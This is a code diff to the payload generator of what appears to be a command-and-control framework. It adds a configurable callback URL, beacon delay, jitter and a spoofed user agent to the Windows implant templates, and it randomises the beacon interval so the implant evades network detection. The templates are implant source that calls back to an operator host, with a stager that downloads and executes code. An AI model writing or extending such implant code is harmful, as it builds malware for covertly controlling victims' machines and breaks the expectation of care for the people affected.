@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 
 	"github.com/ditto/ditto/core"
 	"github.com/ditto/ditto/crypto"
@@ -15,12 +16,17 @@ import (
 
 // Options holds payload generation options
 type Options struct {
-	Type      string
-	Arch      string
-	OS        string
-	Encrypt   bool
-	Obfuscate bool
-	Config    *core.Config
+	Type        string
+	Arch        string
+	OS          string
+	Encrypt     bool
+	Obfuscate   bool
+	Config      *core.Config
+	CallbackURL string // Full callback URL (e.g., http://192.168.1.100:8443 or https://example.com:443)
+	Delay       int    // Beacon delay in seconds (default: 30)
+	Jitter      float64 // Jitter percentage (0.0-1.0, default: 0.0)
+	UserAgent   string // Custom user agent (default: auto-generated)
+	Protocol    string // Protocol: http, https, mtls (default: http)
 }
 
 // Generator handles payload generation
@@ -366,6 +372,7 @@ func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
 		template = `package main
 
 import (
+	"math/rand"
 	"net/http"
 	"time"
 	"os"
@@ -374,7 +381,9 @@ import (
 
 const (
 	callbackURL = "%s"
-	userAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	delay       = %d
+	jitter      = %f
+	userAgent   = "%s"
 )
 
 func main() {
@@ -383,10 +392,11 @@ func main() {
 		os.Exit(1)
 	}
 	
-	// Beacon loop
+	// Beacon loop with jitter
 	for {
 		beacon()
-		time.Sleep(30 * time.Second)
+		sleepDuration := time.Duration(float64(delay) * (1.0 + jitter*(rand.Float64()*2.0-1.0))) * time.Second
+		time.Sleep(sleepDuration)
 	}
 }
 
@@ -428,7 +438,7 @@ import (
 
 const (
 	callbackURL = "%s"
-	userAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	userAgent   = "%s"
 )
 
 func main() {
@@ -469,12 +479,52 @@ func downloadAndExecute() {
 	}
 	
 	// Format callback URL
-	callbackURL := "http://localhost:8443"
-	if opts.Config != nil && opts.Config.Communication.Protocol != "" {
-		callbackURL = opts.Config.Communication.Protocol
+	callbackURL := opts.CallbackURL
+	if callbackURL == "" {
+		// Fallback to config or default
+		if opts.Config != nil && opts.Config.Communication.Protocol != "" {
+			callbackURL = opts.Config.Communication.Protocol
+		} else {
+			callbackURL = "http://localhost:8443"
+		}
 	}
 	
-	source := fmt.Sprintf(template, callbackURL)
+	// Ensure URL has protocol
+	if !strings.HasPrefix(callbackURL, "http://") && !strings.HasPrefix(callbackURL, "https://") {
+		// Auto-detect protocol or use configured one
+		if opts.Protocol == "https" || opts.Protocol == "mtls" {
+			callbackURL = "https://" + callbackURL
+		} else {
+			callbackURL = "http://" + callbackURL
+		}
+	}
+	
+	// Set delay and jitter defaults
+	delay := opts.Delay
+	if delay == 0 {
+		delay = 30 // Default 30 seconds
+	}
+	jitter := opts.Jitter
+	if jitter < 0 {
+		jitter = 0
+	}
+	if jitter > 1.0 {
+		jitter = 1.0
+	}
+	
+	// Set user agent
+	userAgent := opts.UserAgent
+	if userAgent == "" {
+		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	}
+	
+	var source string
+	if opts.Type == "full" {
+		source = fmt.Sprintf(template, callbackURL, delay, jitter, userAgent)
+	} else {
+		// Stager only needs callbackURL and userAgent
+		source = fmt.Sprintf(template, callbackURL, userAgent)
+	}
 	return []byte(source), nil
 }
 
